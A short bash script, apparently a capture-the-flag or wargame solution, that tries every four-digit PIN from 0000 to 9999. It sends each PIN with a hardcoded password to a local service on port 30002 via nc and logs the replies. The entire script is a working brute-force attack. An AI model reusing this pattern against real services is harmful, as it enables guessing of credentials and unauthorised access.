#!/bin/bash
pwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for i in {0000..9999}
do
  echo "$pwd $i" | nc localhost 30002 >> result.txt & echo $i &
  wait
done
